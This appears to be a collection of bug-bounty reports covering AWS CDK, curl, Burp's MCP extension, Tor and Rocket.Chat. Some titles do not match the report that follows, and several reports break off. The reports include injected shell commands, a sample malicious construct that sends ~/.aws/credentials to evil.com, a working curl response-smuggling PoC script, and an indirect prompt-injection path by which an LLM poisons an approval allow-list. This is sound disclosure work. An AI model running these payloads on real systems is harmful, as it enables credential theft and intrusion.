import { NodejsFunction } from 'aws-cdk-lib/aws-lambda-nodejs';
import { Runtime } from 'aws-cdk-lib/aws-lambda';
import { Construct } from 'constructs';
import * as path from 'path';

export class ReproStack extends Stack {
    constructor(scope: Construct, id: string, props?: StackProps) {
        super(scope, id, props);

        new NodejsFunction(this, 'MyHandler', {
            entry: path.join(__dirname, 'lambda', 'lambda-handler.ts'),
            runtime: Runtime.NODEJS_20_X,
            bundling: {
                // INJECTION: The '&' character breaks out of the esbuild argument
                // and executes a second command on the host OS.
                externalModules: ['foo & echo PWNED_VIA_EXTERNAL > pwned_ext.txt'],
                define: {
                    'FOO & echo PWNED_VIA_DEFINE > pwned_def.txt': 'bar'
                }
            }
        });
    }
}

const app = new cdk.App();
new ReproStack(app, 'ReproStack');
app.synth();
```

### Step 6: Run the synthesis

```bash
npx ts-node app.ts
```

This triggers local bundling. The CDK constructs the following shell command (captured from runtime):

```
npx.cmd --no-install esbuild --bundle "...\lambda-handler.ts" --target=node20 --platform=node --outfile="...\index.js" --external:foo & echo PWNED_VIA_EXTERNAL > pwned_ext.txt --define:FOO & echo PWNED_VIA_DEFINE > pwned_def.txt="bar"
```

The `&` character splits the single command into three separate shell commands:
1. `npx.cmd --no-install esbuild --bundle ... --external:foo`, esbuild runs normally
2. `echo PWNED_VIA_EXTERNAL > pwned_ext.txt`, **attacker's injected command executes**
3. `echo PWNED_VIA_DEFINE > pwned_def.txt="bar"`, **attacker's second injected command executes**

### Step 7: Verify RCE

```bash
# On Windows:
type pwned_ext.txt
type pwned_def.txt

# On Linux/macOS:
cat pwned_ext.txt
cat pwned_def.txt
```

Both files are created in the project directory, confirming that the injected shell commands executed successfully.

---

## Relationship to Related Vulnerability

This vulnerability is related to, but distinct from, a separate command injection issue I reported in the same module via `tsconfig.json` compiler options (Report: #3534806 ). Both exploit the same underlying design flaw, unsanitized string concatenation into a shell command, but they differ in entry point, trigger conditions, and attack surface.

| Aspect | Vuln 1: `tsconfig.json` Injection | Vuln 2: Bundling Options Injection (this report) |
|---|---|---|
| **Input source** | `tsconfig.json` file read from disk | CDK construct properties defined in code (`externalModules`, `define`, `loader`, etc.) |
| **Vulnerable function** | `getTsconfigCompilerOptions()` in `lib/util.ts` | `createBundlingCommand()` in `lib/bundling.ts` |
| **Trigger condition** | Requires `preCompilation: true` to be explicitly set | **Always active** — the default local bundling code path processes these properties unconditionally |
| **What gets injected** | Compiler option values from `compilerOptions` in `tsconfig.json` | Values from `externalModules[]`, `define{}` keys, `loader{}` keys, `inject[]`, `esbuildArgs{}` keys/values |
| **Attack vector** | Attacker places a malicious `tsconfig.json` file in the project (e.g., via a PR) | Attacker provides malicious values through a published CDK construct (npm package), a shared internal library, or a PR modifying CDK app code |
| **Number of injectable parameters** | One (`compilerOptions` values) | Multiple (at least 5 distinct properties) |
| **Execution sink** | Same: `exec()` → `spawnSync('cmd'/'bash', ['/c'/'-c', command])` | Same |

Both vulnerabilities converge at the same execution sink: the `exec()` function in `util.ts` (line 74), which passes the assembled command string directly to a shell interpreter via `spawnSync`. This means the root cause is systemic, the entire command construction pipeline in `aws-lambda-nodejs` lacks input sanitization before shell execution. A comprehensive fix should address this at the architectural level by eliminating shell-based command execution in favor of array-based `spawnSync` (without shell interpretation).

---

## Remediation

1. **Use array-based `spawnSync`**: Replace the pattern of building a single shell command string and executing it via `cmd /c` or `bash -c`. Instead, pass arguments directly as an array to `spawnSync('esbuild', [...args])` without shell interpretation.

2. **If shell execution is required**: Escape all user-provided values for the target shell before interpolation. On Windows, this means handling `&`, `|`, `>`, `<`, `^`, etc. On Linux, this means handling `;`, `&`, `|`, `$`, `` ` ``, etc.

3. **Input validation**: Validate that values like `externalModules` entries conform to expected npm package name patterns (e.g., `/^[@a-z0-9][a-z0-9._\/-]*$/`). Reject values containing shell metacharacters.

## Impact

### Attack Scenarios

**1. Malicious Published CDK Construct (Supply Chain Attack)**

An attacker publishes an npm package that exports a "convenience" CDK construct wrapping `NodejsFunction`. The construct passes attacker-controlled values into `externalModules`, `define`, or other unsanitized bundling properties. Any developer or CI/CD system that imports this construct and runs `cdk synth` will execute the attacker's commands.

Example of a malicious construct:

```typescript
// Published as "convenient-lambda" on npm
import { NodejsFunction } from 'aws-cdk-lib/aws-lambda-nodejs';

export class ConvenientLambda extends NodejsFunction {
  constructor(scope, id, props) {
    super(scope, id, {
      ...props,
      bundling: {
        ...props.bundling,
        externalModules: [
          ...(props.bundling?.externalModules ?? []),
          // Attacker payload hidden among legitimate-looking externals
          'lodash & curl https://evil.com/exfil?data=$(cat ~/.aws/credentials | base64)',
        ],
      },
    });
  }
}
```

**2. Malicious Pull Request**

An attacker submits a PR to an open-source or internal CDK project. The PR modifies the `bundling` configuration of a `NodejsFunction` to include a payload. When a reviewer or CI/CD pipeline runs `cdk synth`, the payload executes.

### Consequences

- **Credential Theft**: Steal `~/.aws/credentials`, environment variables, CI/CD secrets
- **Reverse Shell**: Establish persistent access to the build machine
- **Supply Chain Pivot**: Modify build artifacts, inject backdoors into deployed Lambda code
- **Data Exfiltration**: Read source code, database credentials, private keys

---

## Scope of Vulnerability (Affected Properties)

The following `bundling` properties in `NodejsFunction` are vulnerable:

| Property | Source Line | Interpolation Pattern | Sanitization |
|---|---|---|---|
| `externalModules` | L255 | `` `--external:${external}` `` | **None** |
| `loader` (keys) | L256 | `` `--loader:${ext}=${name}` `` | **None** |
| `define` (keys) | L257 | `` `--define:${key}=...` `` | Key: **None**, Value: `JSON.stringify` |
| `inject` | L265 | `` `--inject:"${i}"` `` | **None** |
| `esbuildArgs` (keys/values) | L266 / L451-465 | Various patterns | **None** |
| `banner` | L262 | `` `--banner:js=${JSON.stringify(...)}` `` | `JSON.stringify` (partial) |
| `footer` | L263 | `` `--footer:js=${JSON.stringify(...)}` `` | `JSON.stringify` (partial) |

The most exploitable vectors are `externalModules` and `define` keys since they have zero sanitization and accept arbitrary strings with no validation.

---

title: Incomplete Fix for CVE-2026-21637: OCSPRequest and resumeSession Events Crash Node.js TLS Server via Unhandled Synchronous Exceptions
Duplicate chunked Transfer-Encoding lets a malicious origin smuggle a response across reused HTTP proxy connections
vulnerability_information:
## TL;DR

A malicious HTTP origin can send `Transfer-Encoding: chunked, chunked, gzip` through a reusable HTTP proxy connection to bypass curl's "chunked must be last" guard, queue a forged HTTP response after its own response, and make curl parse that queued data as the response for a later request to a different origin.

## Summary:

curl accepts the malformed HTTP/1.1 response header `Transfer-Encoding: chunked, chunked, gzip`.
curl already has a guard that rejects transfer codings listed after `chunked`, because `chunked` must be the final transfer coding, but a duplicate `chunked` entry bypasses that guard.
In `Curl_build_unencoding_stack()`, the duplicate-`chunked` branch returns `CURLE_OK` for the entire header instead of ignoring only the duplicate token and continuing to parse the later `gzip` token.
When curl uses an HTTP proxy, multiple target origins can share the same client-to-proxy TCP connection.
An attacker who controls only the first requested origin can send this malformed response and queue a forged HTTP response behind the first chunked body; curl can then reuse the proxy connection and parse those queued attacker bytes as the response for a later request to a different origin.

The attacker does not need to control the proxy, the client machine, or the later target origin. They only need the victim workflow to fetch an attacker-controlled HTTP URL before another HTTP URL through the same reusable HTTP proxy connection.

## Affected versions
This appears to affect curl/libcurl versions starting with `8.8.0`.
The vulnerable behavior was introduced by commit `886899143f`; the first release containing that commit is `8.8.0`.

I reproduced the issue on current repository `HEAD` `30c9c79cf8d2`, built from `https://github.com/curl/curl`, on:

```text
curl 8.21.0-DEV (x86_64-pc-linux-gnu) libcurl/8.21.0-DEV zlib/1.2.11
Release-Date: [unreleased]
Protocols: file ftp http ipfs ipns ws
Features: alt-svc AsynchDNS IPv6 Largefile libz threadsafe UnixSockets
```

Platform:

```text
Linux yanzhen 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
```

Relevant code paths:

```c
/* lib/http.c */
result = Curl_build_unencoding_stack(data, v, TRUE);

/* lib/content_encoding.c */
cwt = find_unencode_writer(name, namelen, phase);
if(cwt && is_chunked && Curl_cwriter_get_by_type(data, cwt)) {
  CURL_TRC_WRITE(data, "ignoring duplicate 'chunked' decoder");
  return CURLE_OK;
}

if(is_transfer && !is_chunked &&
   Curl_cwriter_get_by_name(data, "chunked")) {
  failf(data, "Reject response due to 'chunked' not being the last "
        "Transfer-Encoding");
  return CURLE_BAD_CONTENT_ENCODING;
}
```

The early `return CURLE_OK` skips the later `gzip` token in `Transfer-Encoding: chunked, chunked, gzip`, so the existing "chunked not last" rejection is never reached.

## Steps To Reproduce:
Run the following self-contained PoC from a curl source checkout after building `src/curl`. It does not call any local PoC file. It starts a local HTTP proxy simulator, makes one request to `attacker.test` followed by one request to `victim.test` in the same curl process, and checks whether bytes queued after the first response are parsed as the second origin's response.

```bash
python3 <<'PY'
import os, shutil, socket, subprocess, threading, time

curl_bin = os.environ.get("CURL_BIN")
if not curl_bin:
    curl_bin = "./src/curl" if os.path.exists("./src/curl") else shutil.which("curl")
if not curl_bin:
    raise SystemExit("Set CURL_BIN or run from a curl checkout with ./src/curl")

def read_headers(conn):
    data = b""
    while b"\r\n\r\n" not in data:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk
    return data

def run_case(te_value):
    listener = socket.socket()
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind(("127.0.0.1", 0))
    listener.listen(1)
    port = listener.getsockname()[1]
    seen_requests = []

    def proxy():
        conn, _ = listener.accept()
        conn.settimeout(5)
        try:
            seen_requests.append(read_headers(conn))
            conn.sendall(
                b"HTTP/1.1 200 OK\r\n"
                + b"Transfer-Encoding: " + te_value.encode("ascii") + b"\r\n"
                + b"Connection: keep-alive\r\n\r\n"
                + b"5\r\nHELLO\r\n0\r\n\r\n"
            )

            # Attacker-controlled bytes queued after the first response.
            time.sleep(0.2)
            conn.sendall(
                b"HTTP/1.1 200 OK\r\n"
                b"Content-Length: 9\r\n"
                b"Connection: keep-alive\r\n\r\n"
                b"SMUGGLED!"
            )

            try:
                seen_requests.append(read_headers(conn))
                time.sleep(0.2)
                conn.sendall(
                    b"HTTP/1.1 200 OK\r\n"
                    b"Content-Length: 7\r\n"
                    b"Connection: close\r\n\r\n"
                    b"BENIGN\n"
                )
            except Exception:
                pass
        finally:
            conn.close()
            listener.close()

    threading.Thread(target=proxy, daemon=True).start()
    proc = subprocess.run(
        [
            curl_bin,
            "-q",
            "--http1.1",
            "--proxy", f"http://127.0.0.1:{port}",
            "-sS",
            "-v",
            "http://attacker.test/one",
            "http://victim.test/two",
        ],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        timeout=10,
    )
    return proc, seen_requests

print(subprocess.check_output([curl_bin, "--version"], text=True).splitlines()[0])

control, _ = run_case("chunked, gzip")
control_err = control.stderr.decode("latin1", "replace")
print("control_exit:", control.returncode)
print("control_rejected:", "A Transfer-Encoding (gzip) was listed after chunked" in control_err)

vuln, seen = run_case("chunked, chunked, gzip")
vuln_out = vuln.stdout.decode("latin1", "replace")
vuln_err = vuln.stderr.decode("latin1", "replace")
print("vulnerable_exit:", vuln.returncode)
print("vulnerable_stdout:", vuln_out)
print("second_request_reached_proxy:", len(seen) >= 2)
print("proxy_connection_reused:", "Reusing existing http: connection with proxy" in vuln_err)

if (
    "A Transfer-Encoding (gzip) was listed after chunked" in control_err
    and vuln.returncode == 0
    and vuln_out == "HELLOSMUGGLED!"
    and len(seen) >= 2
    and "Reusing existing http: connection with proxy" in vuln_err
):
    print("VULNERABLE: queued attacker bytes were parsed as the second origin response")
else:
    print("NOT REPRODUCED")
    print(vuln_err)
    raise SystemExit(1)
PY
```

Expected output on a vulnerable build:

```text
curl 8.21.0-DEV (x86_64-pc-linux-gnu) libcurl/8.21.0-DEV zlib/1.2.11
control_exit: 56
control_rejected: True
vulnerable_exit: 0
vulnerable_stdout: HELLOSMUGGLED!
second_request_reached_proxy: True
proxy_connection_reused: True
VULNERABLE: queued attacker bytes were parsed as the second origin response
```

The control case proves that curl correctly rejects `Transfer-Encoding: chunked, gzip`.
The vulnerable case proves that adding a duplicate `chunked` token changes the result: curl accepts `Transfer-Encoding: chunked, chunked, gzip`, consumes `HELLO` as the first response body, then parses `SMUGGLED!` as the body of the second request to `victim.test`.

## Impact

## Summary:
An attacker who controls one ordinary HTTP origin can make curl/libcurl parse queued attacker bytes as the response for a later request to a different origin when an HTTP/1.1 proxy connection is reused. The attacker does not need local access, proxy control, or control of the later origin; they only need the victim workflow to fetch the attacker URL first through the same proxy. This can cause cross-origin response injection, cache poisoning, corrupted fetcher/proxy output, or incorrect trust decisions.

title: Burp Suite Professional: browser-powered crawl can write attacker-controlled files through file input handling
UI Consent Bypass via Comma Injection in `addAutoApproveTarget` — User-Approval Dialog and Persistence Layer Disagree on Target Scope, Yielding Authen
vulnerability_information:
## Summary
Burp Suite MCP Server BApp v1.2.1 fails to validate hostnames passed to `addAutoApproveTarget` (`McpConfig.kt:52`). A single user click on the per-request approval dialog persists an attacker-controlled comma-separated hostname as multiple independent allow-list entries, because `_autoApproveTargets` is stored as a comma-joined string and `getAutoApproveTargetsList` re-splits on `,` (`McpConfig.kt:73`).

A malicious MCP client — or an LLM operating on attacker-controlled content via indirect prompt injection (the canonical MCP threat model) — can poison the auto-approve list with one click, then silently SSRF to localhost services, internal hosts, cloud metadata, and arbitrary wildcard subdomain trees without any further interaction.
This regresses the protection model that motivated report #3176157

## Threat Model

Canonical MCP indirect prompt injection. An LLM (Claude Desktop, Cursor, Cline, etc.) connected to Burp's MCP server reads attacker-influenced content (web page, document, ticket, search result) and constructs a `send_http1_request` tool call with an attacker-chosen `targetHostname`. The user sees one approval dialog, clicks **Always Allow Host** trusting the leading legitimate-looking domain, and that single click persists multiple silent allow-rules the inverse of the user's intent.

## Root Cause

**Sink 1 — Storage accepts unvalidated multi-host string**
`src/main/kotlin/net/portswigger/mcp/config/McpConfig.kt`, lines 52–60:

```kotlin
fun addAutoApproveTarget(target: String): Boolean {
    val currentTargets = getAutoApproveTargetsList()
    if (target.trim().isNotEmpty() && !currentTargets.contains(target.trim())) {
        val newTargets = currentTargets + target.trim()
        autoApproveTargets = newTargets.joinToString(",")
        return true
    }
    return false
}
```

`TargetValidation.isValidTarget` exists in the codebase but is never invoked here. Only emptiness and duplication are checked.

**Sink 2 — Reader splits on the same delimiter used to write**
`src/main/kotlin/net/portswigger/mcp/config/McpConfig.kt`, lines 73–79:

```kotlin
fun getAutoApproveTargetsList(): List<String> {
    return if (_autoApproveTargets.isBlank()) emptyList()
    else _autoApproveTargets.split(",").map { it.trim() }.filter { it.isNotEmpty() }
}
```

One write of `"a,b,c"` becomes three independent entries on read.

**Sink 3 — Attacker-controlled hostname passed straight from JSON-RPC to persistence**
`src/main/kotlin/net/portswigger/mcp/security/HttpRequestSecurity.kt`, lines 44, 49:

```kotlin
1 -> { config.addAutoApproveTarget(hostname); continuation.resume(true) }
2 -> { config.addAutoApproveTarget("$hostname:$port"); continuation.resume(true) }
```

`hostname` originates from the `targetHostname` JSON-RPC parameter of the `send_http1_request` (and related) MCP tools — fully attacker-controlled.

**Sink 4 — Dialog renders payload verbatim, masking what gets persisted**
`src/main/kotlin/net/portswigger/mcp/config/Dialogs.kt`, `showOptionDialog`:

The approval dialog renders `Target: $hostname:$port` in a `JTextArea` with no escaping or splitting. A comma-laden hostname displays on a single line beginning with the leading domain, which a user reasonably reads as the target. This is the misrepresentation that makes CWE-451 apply: what the user authorizes = what the system persists.

## Reproduction
Tested against running BApp v1.2.1 on Kali Linux

### Pre-conditions

1. Burp MCP Server BApp v1.2.1 installed and enabled (Burp → MCP tab → Enabled)
2. "Require approval for HTTP requests" checked (default state on fresh install)
3. Auto-Approved HTTP Targets list cleared (Burp → MCP tab → Auto-Approved HTTP Targets → "Clear All")

### Setup victim service for file-read demonstration

```bash
mkdir -p /tmp/internal && echo "INTERNAL_API_KEY=sk_live_abc123_DO_NOT_LEAK" > /tmp/internal/secret.txt
cd /tmp/internal && python3 -m http.server 8123 &
```
### Step 1 — Poison the auto-approve list with one tool call

```bash
python3 - << 'EOF'
import asyncio
from mcp.client.sse import sse_client
from mcp import ClientSession
```

title: Secure cookies leaked to HTTP origins through HTTPS forwarding proxy
vulnerability_information:
## Summary:
When curl accesses an `http://` origin through an HTTPS forwarding proxy, it sends Secure cookies in the request. The cookies travel in cleartext between the proxy and the origin server, visible to the proxy operator and anyone on that network path. curl also reports `CURLINFO_SCHEME` as `"https"` to the application for what is an `http://` transfer, which can mislead application-level security logic.

This is a regression introduced on 2026-06-12 in [commit 73daec6](https://github.com/curl/curl/commit/73daec6620bf9983df89e8df3660bfa3b8fd501d) ([PR #21967](https://github.com/curl/curl/pull/21967)). [proxy.c:652](https://github.com/curl/curl/blob/bb837dd/lib/proxy.c#L652) sets `conn->scheme` to the proxy's HTTPS scheme. `Curl_secure_context()` ([cookie.c:1273](https://github.com/curl/curl/blob/bb837dd/lib/cookie.c#L1273)) checks `conn->scheme->protocol & CURLPROTO_HTTPS` and returns TRUE, so Secure cookies are included. Before this commit, `conn->scheme` held the origin's scheme and Secure cookies were correctly withheld.

The same `conn->scheme` change causes [url.c:2505](https://github.com/curl/curl/blob/bb837dd/lib/url.c#L2505) to report `CURLINFO_SCHEME` as `"https"` for an `http://` origin.

## Affected version
```
$ curl  --version
curl 8.21.0-DEV (Linux) libcurl/8.21.0-DEV OpenSSL/3.0.20 zlib/1.2.13 brotli/1.0.9 zstd/1.5.4 libpsl/0.21.2 nghttp2/1.52.0
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt mqtts pop3 pop3s rtsp smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli HSTS HTTP2 HTTPS-proxy IPv6 Largefile libz PSL SSL threadsafe TLS-SRP UnixSockets zstd
```

Only affected since commit [73daec6](https://github.com/curl/curl/commit/73daec6620bf9983df89e8df3660bfa3b8fd501d) (2026-06-12). No released version is affected. Still present on origin/master at [79a2416](https://github.com/curl/curl/commit/79a24161ab) as of 2026-06-15.

## Steps To Reproduce:

A self-contained Dockerfile and patch (`fix.patch`) are attached. The Dockerfile builds three curl binaries from source: pre-regression (`c951368`), regression (`bb837dd`), and regression with the suggested fix applied. It also runs a Squid HTTPS forwarding proxy and a plain HTTP origin server that logs received cookies.

```bash
docker build -t cookie-proxy .
docker run --rm -it cookie-proxy
```

Inside the container, test each binary:

```bash
curl-safe  -sv -x https://127.0.0.1:8443 --proxy-insecure -b /tmp/cookies.txt http://test.example:8080/path
curl-vuln  -sv -x https://127.0.0.1:8443 --proxy-insecure -b /tmp/cookies.txt http://test.example:8080/path
curl-fixed -sv -x https://127.0.0.1:8443 --proxy-insecure -b /tmp/cookies.txt http://test.example:8080/path
```

Check what the origin received:

```bash
tail /tmp/origin.log
```

`curl-vuln` leaks the Secure cookie (the verbose output includes a `Cookie:` header, and the origin log confirms receipt). `curl-safe` and `curl-fixed` withhold it (no `Cookie:` header, origin log shows `RECEIVED no Cookie header`).

## Suggested fix

A patch is attached (`fix.patch`). `Curl_secure_context()` should check `data->state.origin->scheme` instead of `conn->scheme`. The refactor already migrated most security checks to `data->state.origin` but missed this function. The `conn->scheme` assignment at [proxy.c:652](https://github.com/curl/curl/blob/bb837dd/lib/proxy.c#L652) is still needed for SSL filter setup, so it should stay, but `Curl_secure_context()` should not read it. `Curl_xfer_is_secure()` is not affected because it has an additional `Curl_conn_is_ssl()` check that correctly excludes proxy SSL filters ([cfilters.c:693](https://github.com/curl/curl/blob/bb837dd/lib/cfilters.c#L693)).

## Impact

Secure cookies (session tokens, auth cookies, CSRF tokens) are sent in cleartext over the HTTP connection between the HTTPS proxy and the origin server. Anyone who can observe that network path can read them. The proxy operator can harvest them regardless. The `CURLINFO_SCHEME` misreporting can also trick application-level security checks (e.g. "only allow this action over HTTPS") into treating an insecure transfer as secure.

The bug affects all HTTP methods (GET, HEAD, POST, PUT, DELETE, PATCH, etc.) because the Secure context check runs in `Curl_cookie_getlist` ([cookie.c:1300](https://github.com/curl/curl/blob/bb837dd/lib/cookie.c#L1300)), which is called from the request header construction path for every method. WebSocket upgrade requests (`ws://` through the proxy) are also affected. Any libcurl application using the cookie engine (`CURLOPT_COOKIEFILE` / `CURLOPT_COOKIEJAR`) through an HTTPS proxy is affected, not just the curl CLI.

RFC violated: [RFC 6265](https://datatracker.ietf.org/doc/html/rfc6265#section-5.4) Section 5.4 step 3 ties "secure channel" to the `https` URI scheme ([RFC 7230](https://datatracker.ietf.org/doc/html/rfc7230#section-2.7.2) Section 2.7.2). The request uses `http://`, so Secure cookies must not be sent regardless of the TLS transport to the proxy.

summaries.author: daviey
summaries.content:
A regression in commit [`73daec6`](https://github.com/curl/curl/commit/73daec6620bf9983df89e8df3660bfa3b8fd501d) caused `Curl_secure_context()` to use the proxy's HTTPS scheme instead of the origin's scheme when forwarding through an HTTPS proxy, leaking Secure cookies to HTTP origins in cleartext. Fix in PR [#22024](https://github.com/curl/curl/pull/22024).

title: Incomplete Suppression of  Transfer-Encoding: chunked Header in HTTP/2 After Redirect From HTTP/1.1
vulnerability_information:
When curl  send a request with `Transfer-Encoding: chunked` using HTTP/1.1, and follows a redirect to an HTTP/2 endpoint, the `upload_chunky` flag is not properly reset. As a result, the `Transfer-Encoding: chunked` header is sent in the subsequent request even when HTTP/2 is negotiated/used.

This violates RFC 9113 (HTTP/2) which states that HTTP/2 uses its own farming and `Transfer-Encoding` header must not be used.

##Proof OF Concept
Setup:
Local test server with HTTP/1.1 ---> HTTPS (HTTP/2) redirect 
`Reproduction Command:`
```bash
curl -vvv --http1.1 --no-alpn -L --http2 -k \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Type: text/plain" \
  -d "This is chunked encoding bug test data" \
  http://test.local:8080/
```
##Observed Behavior:
- First request (HTTP/1.1): `Transfer-Encoding: chunked` --> Correct
- Second request (after redirect): 'Transfer-Encoding: chunked' is still present ---> Vulnerable Even with `--http2` flag, the header is not suppressed.

##Root Cause
in 'lib/http.c'
- `http_req_set_TE()` and 'http_add_content_hds()' functions only check HTTP version at intial request setup.
- During redirect handling ('Curl_follow_Location()' / new Request setup), the 'data->req.upload_chunky' falg is not relible reset when protocol changes from HTTP/1.1 ---> HTTP/2.

## Impact

- Protocol confusion between client and server / proxies.
- potential for `HTTP Request Smuggling / Desync attack` in enviroments with reverse proxies or CDNs that handle HTTP/1.1 <--> HTTP/2 translation.
- Unexpected behavior in middleboxes and caching systems.

title: Malicious Conflux Endpoint Can Leave Stale Global OOO Queue Accounting After Teardown
vulnerability_information:
## Summary

Tor's Conflux OOO queue accounting can remain inflated after a Conflux set is
torn down. A malicious Conflux-capable endpoint relay can send a real
`CONFLUX_SWITCH` gap followed by `RELAY_DATA` cells, causing the client to queue
out-of-order messages. When teardown happens before normal dequeue,
`conflux_free_()` frees those messages but does not subtract their cost from
`total_ooo_q_bytes`.

The victim client is unmodified in the PoC. Only the attacker-controlled exit
relay is patched so it emits hostile Conflux traffic through Tor's normal
relay-cell send path.

## Root Cause

The accounting is balanced on normal dequeue, but not on teardown.

In `src/core/or/conflux.c`, OOO enqueue increments both counters:

```c
total_ooo_q_bytes += cost;
cfx->ooo_q_alloc_cost += cost;
```

The normal dequeue path subtracts the same cost:

```c
total_ooo_q_bytes -= cost;
cfx->ooo_q_alloc_cost -= cost;
```

But `src/core/or/conflux_pool.c:conflux_free_()` frees queued messages without
the matching accounting update:

```c
SMARTLIST_FOREACH(cfx->ooo_q, conflux_msg_t *, cell,
                  conflux_relay_msg_free(cell));
smartlist_free(cfx->ooo_q);
```

That leaves `total_ooo_q_bytes` counting memory that has already been freed.
This stale value is later included in `src/core/or/relay.c:cell_queues_check_size()`:

```c
const size_t conflux_total = conflux_get_total_bytes_allocation();
alloc += conflux_total;
```

If the global allocation total reaches `MaxMemInQueues`, Tor's OOM recovery path
can close circuits through `circuits_handle_oom()`.

## PoC / Evidence

The attached PoC builds two Tor binaries and runs a private Chutney network. The
victim side uses the clean Tor binary. The second binary is used only for
attacker-controlled exit relays, where the patch sends real `CONFLUX_SWITCH`
and `RELAY_DATA` cells on the negotiated Conflux leg. The harness then restarts
clean exits to force normal teardown and reads
`conflux_get_total_bytes_allocation()` / `MaxMemInQueues` from the clean client
with `gdb`.

Attached PoC files:

- `poc-files/run-poc.sh`
- `poc-files/attacker-relay.diff`
- `poc-files/chutney-network`

Build and run the proof:

```sh
mkdir -p ~/conflux-ooo-oom-check
cd ~/conflux-ooo-oom-check

git clone https://gitlab.torproject.org/tpo/core/tor.git tor-clean
git clone https://gitlab.torproject.org/tpo/core/tor.git tor-attacker-exact
git clone https://gitlab.torproject.org/tpo/core/chutney.git chutney

cp /path/to/poc-files/attacker-relay.diff ~/
cp /path/to/poc-files/chutney-network ~/
cp /path/to/poc-files/run-poc.sh ~/
```

Build the clean victim/network binary:

```sh
cd ~/conflux-ooo-oom-check/tor-clean
git checkout a66e072d7f3752fe98d4e59129b35b0942d4399b
./autogen.sh
./configure --disable-asciidoc
make -j"$(nproc)"
```

Build the attacker-exit binary:

```sh
cd ~/conflux-ooo-oom-check/tor-attacker-exact
git checkout a66e072d7f3752fe98d4e59129b35b0942d4399b
git apply ~/attacker-relay.diff
./autogen.sh
./configure --disable-asciidoc
make -j"$(nproc)"
```

Install Chutney dependencies if needed:

```sh
cd ~/conflux-ooo-oom-check/chutney
python3 -m venv .venv
. .venv/bin/activate
python3 -m pip install -U 'typing_extensions' 'typeguard==4.3.0' \
  'tomli-w~=1.2.0' 'paramiko~=4.0' 'cryptography~=3.4'
```

Allow local counter inspection with `gdb`:

```sh
# Measurement only. This does not change Tor behavior or the attack path.
sudo sysctl -w kernel.yama.ptrace_scope=0
```

Run the proof script:

```sh
cd ~
. ~/conflux-ooo-oom-check/chutney/.venv/bin/activate

ROUNDS=4 \
TARGET_COUNTER=1000000 \
TRAFFIC_PASSES=1 \
TRAFFIC_TIMEOUT=35 \
TOR_CONFLUX_OOO_CELLS=900 \
TOR_CONFLUX_OOO_PROBES=60 \
  bash ~/run-poc.sh
```

Successful proof output:

```text
timestamp                  label                         mem_available_mb  client_rss_mb  client_vmsize_mb  conflux_counter  max_mem_in_queues  attacker_sends  oom_lines
2026-04-28T22:59:29+05:30  baseline                      7872.5            12.6           306.1             0                6625393048         0               0
2026-04-28T23:00:14+05:30  round-1-after-attack          7886.2            12.8           313.9             327716           6625393048         83              0
2026-04-28T23:00:24+05:30  round-1-after-clean-restart   8052.1            12.8           313.9             327716           6625393048         83              0
2026-04-28T23:01:09+05:30  round-2-after-attack          7918.1            12.8           313.9             720904           6625393048         185             0
2026-04-28T23:01:19+05:30  round-2-after-clean-restart   8079.9            12.8           313.9             720904           6625393048         185             0
2026-04-28T23:02:04+05:30  round-3-after-attack          7870.9            12.8           313.9             1441452          6625393048         278             0
2026-04-28T23:02:14+05:30  round-3-after-clean-restart   8205.4            12.8           313.9             1441452          6625393048         278             0
[result] target counter reached: 1441452 >= 1000000
```

Attacker-side proof line:

```text
PoC: Conflux OOO exact-leg probe queued 124 DATA cells; stop this exit now to force client-side teardown
```

The important observation is that the Conflux allocation counter remains
non-zero after the attacker exits are replaced by clean exits. This confirms
successful exploitation of the stale accounting bug after real teardown under
default `MaxMemInQueues` settings. No OOM was triggered in this run.



## Recommended Fix

Make Conflux OOO teardown use the same accounting invariant as normal dequeue.

```c
static void
conflux_free_queued_msg_accounted(conflux_t *cfx, conflux_msg_t *msg)
{
  size_t cost = conflux_msg_alloc_cost(msg);

  if (BUG(total_ooo_q_bytes < cost))
    total_ooo_q_bytes = 0;
  else
    total_ooo_q_bytes -= cost;

  if (BUG(cfx->ooo_q_alloc_cost < cost))
    cfx->ooo_q_alloc_cost = 0;
  else
    cfx->ooo_q_alloc_cost -= cost;

  conflux_relay_msg_free(msg);
}
```

Then use it from `conflux_free_()`:

```c
SMARTLIST_FOREACH(cfx->ooo_q, conflux_msg_t *, cell,
                  conflux_free_queued_msg_accounted(cfx, cell));
smartlist_free(cfx->ooo_q);
```

Regression tests should verify that teardown with a non-empty Conflux OOO queue
returns `conflux_get_total_bytes_allocation()` to zero.

## Impact

A malicious Conflux-capable endpoint can cause Tor's global Conflux OOO
queue-memory counter to remain inflated after teardown, and that stale counter
can persist until Tor restart.

This can also affect Tor's OOM recovery path if enough stale accounting
accumulates, but this report does not include a default-config OOM PoC.

Why: stale bytes count against `MaxMemInQueues` until restart.

title: Unauthenticated file deletion via deleteFileMessage DDP method allows permanent destruction of any uploaded file

summaries.author: julio_araujo
summaries.content: The deleteFileMessage Meteor method permanently deletes any uploaded file by ID without requiring authentication. When called via an unauthenticated DDP WebSocket connection, Meteor.userId() returns null, causing the authorization check to be skipped. Execution falls through to FileUpload.getStore('Uploads').deleteById(fileID), which removes the file from storage and database unconditionally. File IDs are discoverable from public channel message payloads and download URLs.

title: Vulnerability Report: Buffer Overflow in Path Sanitization
vulnerability_information:
# Vulnerability Report: Buffer Overflow in Path Sanitization

## Summary
Multiple buffer overflow vulnerabilities exist in the `src/tool_doswin.c` file due to insufficient bounds checking and improper memory management in path sanitization functions.

## Affected Components
- `sanitize_file_name` (line ~180)
- `msdosify` (line ~120)
- `rename_if_reserved_dos` (line ~70)

## Vulnerability Details

### CVE-2024-XXXX-A: Integer Overflow in Path Length Calculation
**Location**: `msdosify` function  
**Description**: Performs arithmetic operations on path lengths without proper validation, leading to potential integer overflow and subsequent buffer overflows.

### CVE-2024-XXXX-B: Improper Bounds Checking in Path Expansion
**Location**: `rename_if_reserved_dos` function  
**Description**: Modifies strings in-place without checking if resulting paths exceed buffer boundaries, potentially causing heap corruption.

### CVE-2024-XXXX-C: Missing Null-Termination in String Operations
